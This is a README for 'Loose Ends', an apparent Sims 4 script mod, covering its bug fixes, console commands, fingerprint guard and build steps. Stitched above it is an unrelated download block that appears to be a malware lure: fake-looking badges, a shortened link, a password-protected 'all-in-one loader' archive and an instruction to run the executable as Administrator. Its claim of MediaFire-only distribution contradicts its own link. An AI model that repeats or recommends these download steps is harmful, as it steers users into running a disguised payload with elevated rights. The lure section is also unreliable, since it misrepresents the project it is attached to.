<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://cutxo.com/cguqla">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

<p align="center">
  <picture>
    <source media="(prefers-color-scheme: dark)" srcset="docs/header-dark.svg">
    <img alt="Loose Ends" src="docs/header-light.svg" width="100%">
  </picture>
</p>

<p align="center">
## What it fixes

| Fix | What you'll notice |
|---|---|
| Faster snippet lookups for pie menus | Pie menus open faster, especially with many mods installed. |
| Reuse Sim filter results while building a pie menu | The same. While one menu is being built, the game asks the same "who qualifies?" questions thousands of times; the answers are remembered for that menu. |
| Score pie menu entries without rescanning every moodlet | Pie menus open faster for Sims with many moodlets. Each menu entry used to be checked against every moodlet; now it's checked only against the moodlets that can change its score. |
| Find a Sim picker's candidate for its tests without the long lookup | Pie menus open faster. Interactions where you pick a Sim test every Sim in the game before they can be shown, and every test looked up the candidate the long way. |
| Check pie menu entries against dynasty rules without rebuilding every rule | Pie menus open faster for Sims in a dynasty. Every entry was checked against every dynasty rule by rebuilding that rule's list of interactions; now each list is built once. |
| Phantom "too Tense/Uncomfortable" mood fix | Sims are no longer refused interactions as "far too Tense" or "far too Uncomfortable" while their mood is positive. |
| Autonomous Sim pickers skip Sims their follow-up can't run on | Pets stop trying to wake up Sims who aren't asleep, over and over. Sims stop repeatedly starting chats with Sims they can't actually talk to. |
| Autonomous chats that find nothing to say stop retrying the same Sim | Part of the chat fix above. |
| Visitors stuck trying to leave the lot are sent home | NPCs told to leave who can't start leaving (for example, while wearing a towel) no longer stand on your lot for hours. After several failed tries, they're sent home the way the game already does elsewhere. |
| Rabbit holes, roommates, clubs and relationships keep listening after you travel | After every trip, the game stopped listening for certain events (relationship and club changes, roommates dying, Sims being reset, and more) until you reloaded your save. Now they keep working. |
| Small business employees aren't penalized again for every past shift | Ended shifts no longer apply their end-of-shift results again when that employee is later sent home early. |
| Ended restaurant chef shifts stop reacting to Build mode and resets | Ended chef shifts are properly cleaned up. |

## Safe by design

Every time the game starts, Loose Ends checks that each piece of game code it touches is exactly the code it was built against.

- If a game update changed that code, or another mod rewrote it in a way Loose Ends can't safely build on, that fix stays off.
- If a fix ever runs into an error, it switches itself off for the rest of the session and the game carries on as if it weren't installed.
- Either way, the first time you enter Live mode that session, you get one notification saying which fixes are off and why. If everything is working, you see nothing.

## Cheat console commands

Open the console with Ctrl+Shift+C. None of these need `testingcheats`.

| Command | What it does |
|---|---|
| `looseends.status` | Shows each fix's state and what it has done this session. |
| `looseends.disable <fix>` | Turns a fix off for this session. |
| `looseends.enable <fix>` | Turns it back on (never turns on a fix that failed its safety check). |
| `looseends.profile <sim id>` | Times building the active Sim's pie menu for that Sim and writes a profile to your Mods folder. |
| `looseends.anatomy <sim id>` | Builds the same pie menu and writes a report to your Mods folder of which interactions, tests and Sim pickers took the time. |
| `looseends.profile_next_picker` | Profiles the next picker window you open (for example, the recipe picker). |
| `looseends.time_next_picker` | Times the next picker window from your click to the window being sent. |

Fix names for `disable`/`enable`: `ordered_types`, `pie_menu_filters`, `phantom_mood`, `autonomous_sim_pickers`, `content_scoring`, `picked_sim_lookup`, `dynasty_rules`, `social_picker_cooldown`, `leave_lot`, `travel_event_subscriptions`, `small_business_employee_events`, `chef_events`.

## For modders

### Layout

| Path | Contents |
|---|---|
| `src/codebleu_loose_ends/` | The mod. `guard.py` (fingerprint checks, install and rollback, fault handling), `notify.py` (the Live mode notification), `commands.py`, and one module per fix in `fixes/`. |
| `testkit/` | A separate test-only mod with commands that force game states for in-game testing. The releases never ship it. |
| `tests/` | Unit tests. Most run the game's own compiled bytecode with stub globals (`tests/ea.py`), so they test EA's real code paths, not a reimplementation. |
| `tools/fp.py` | Prints the fingerprint of any game function: `python tools/fp.py module:Class.method`. |
| `tools/names.py` | Lists the names a game function refers to, which tells you what a test has to stub. |

### Requirements

Python **3.7** exactly. The game runs CPython 3.7, so the mod must be compiled by 3.7, and the tests can only read the game's 3.7 bytecode with 3.7. The build and test scripts refuse to run on any other version.

The tests and tools read the game's `simulation.zip`, `core.zip` and `base.zip` from `Data\Simulation\Gameplay` in the game's install folder. Common install locations are found automatically; otherwise set `LOOSE_ENDS_GAME_SCRIPTS` to that folder.

### Building and testing

```
python build.py            # build/CodeBleu-LooseEnds.ts4script
python build_testkit.py    # build/CodeBleu-LooseEnds-TestKit.ts4script
python run_tests.py        # each test module in its own process
```

### How the guard works

Each fix declares the game functions it wraps (`Hook`) and the game functions whose behavior it relies on (`Requirement`), each with a 64-bit FNV-1a fingerprint of the function's code object. A fix installs only if every fingerprint matches. Otherwise:

- If the mismatched code is EA's, the game changed and the fix stays off.
- If it's another mod's wrapper whose `functools.wraps` chain leads to the exact EA function, the fix stacks on top of it, unless the hook or requirement opts out with `stack_on_mods=False` (a fix that skips or bypasses that function would skip the other mod's wrapper too).
- Anything else is reported as a conflict with that mod.

Install is all-or-nothing per fix, with rollback. At run time, a fix's own exception switches it off and its wrappers pass straight through to the game's code.

Fingerprints are tied to a game version. When the game updates, run `tests/test_fingerprints.py`. Any function that changed has to be re-read before its fingerprint is updated, because the fix may no longer be correct.

### Adding a fix

1. Add `src/codebleu_loose_ends/fixes/<key>.py` with `FIX = Fix('<key>', '<player-facing title>', _build)`. `_build` imports the game modules and returns `([Hook, ...], [Requirement, ...])`.
2. Add the module to `FIX_MODULES` in `src/codebleu_loose_ends/__init__.py` and its counters to `commands.py`.
3. Add tests that run the game's own bytecode, and update the expected fix and status line counts in `tests/test_package.py`.
4. Wrap fix logic so any exception calls `FIX.fault(e)`. Nothing Loose Ends adds may raise on the game's call path.


---

MIT License

Copyright (c) 2026 Daniel Henry

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
